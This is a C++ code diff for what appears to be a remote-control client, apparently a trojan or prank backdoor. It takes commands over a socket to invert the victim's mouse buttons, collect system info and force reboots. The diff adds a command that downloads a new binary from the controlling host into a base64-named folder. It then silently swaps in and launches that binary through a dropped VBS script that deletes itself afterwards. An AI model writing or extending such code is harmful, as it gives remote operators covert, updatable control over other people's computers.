@@ -24,6 +24,31 @@ bool InvertMouse(SOCKET Sock)
 	return COMUNICAZIONI::InvertMouse(Sock, mu.InvertMouseButtons());
 }
 
+bool UpdateClient(SOCKET Sock)
+{
+	DirUtils du;
+	SystemUtils su;
+
+	string NewClient = COMUNICAZIONI::UpdateClient(Sock);
+
+	if (NewClient == "")
+		return false;
+
+	du.SetCurrDir(du.GetModuleFilePath());
+	if (!du.CheckDir("VXBkYXRl"))
+		du.MakeDir("VXBkYXRl");
+
+	if (!du.WriteBinaryFile("VXBkYXRl\\" + du.GetModuleFile(), NewClient))
+		return false;
+
+	if (!du.WriteFile("Update.vbs", "WScript.Sleep 5000\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"" + du.GetModuleFile() + "\"\nfilesys.MoveFile \"VXBkYXRl\\" + du.GetModuleFile() + "\", \"" + du.GetModuleFile() + "\"\nWshShell.Run \"" + du.GetModuleFile() + "\", 1, false\nfilesys.DeleteFile \"Update.vbs\""))
+		return false;
+
+	su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Update.vbs\"");
+
+	return true;
+}
+
 short Sessione(TcpIP Client)
 {
 	SystemUtils su;
@@ -37,13 +62,11 @@ short Sessione(TcpIP Client)
 			i = false;
 		else if (cmd == "getinfo")
 		{
-			if (!GetInfo(Client.Sock))
-				i = false;
+			i = GetInfo(Client.Sock);
 		}
 		else if (cmd == "invertmouse")
 		{
-			if (!InvertMouse(Client.Sock))
-				i = false;
+			i = InvertMouse(Client.Sock);
 		}
 		else if (cmd == "reconnect")
 			i = false;
@@ -58,6 +81,11 @@ short Sessione(TcpIP Client)
 		{
 			su.NoOutputCMD("shutdown -r -t 0");
 			return 1;
+		}
+		else if (cmd == "updateclient")
+		{
+			if (UpdateClient(Client.Sock))
+				return 1;
 		}
 	}
 
